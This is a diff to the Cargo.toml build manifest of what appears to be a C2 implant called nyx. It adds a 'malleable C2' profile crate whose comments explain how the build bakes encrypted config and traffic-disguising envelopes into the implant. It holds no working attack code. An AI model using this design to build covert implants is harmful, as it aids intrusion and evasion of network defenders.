@@ -34,11 +34,19 @@ nyx-coff = { path = "../coff" }
 # on the host (std) and bakes key/nonce/ciphertext into OUT_DIR/config_blob.rs;
 # the runtime crate only decrypts.
 nyx-config = { path = "../config", default-features = false, features = ["no_std"] }
+# Malleable C2 transform engine (no_std): the implant applies the http-post
+# client envelope to each request body and inverts the server envelope on each
+# response. build.rs resolves the profile host-side (std) and bakes the
+# resolved Step/Terminator lists; the runtime crate only encodes/decodes.
+nyx-profile = { path = "../profile", default-features = false, features = ["no_std"] }
 
 [build-dependencies]
 # build.rs encrypts the config blob per-build (host-side, std). Needs the
 # `std` feature for nyx_config::encrypt (OsRng-backed).
 nyx-config = { path = "../config" }
+# build.rs parses NYX_PROFILE (host-side, std) and bakes the resolved envelope
+# Step/Terminator lists into OUT_DIR/envelopes.rs for the runtime crate.
+nyx-profile = { path = "../profile" }
 
 [profile.release]
 opt-level = "z"
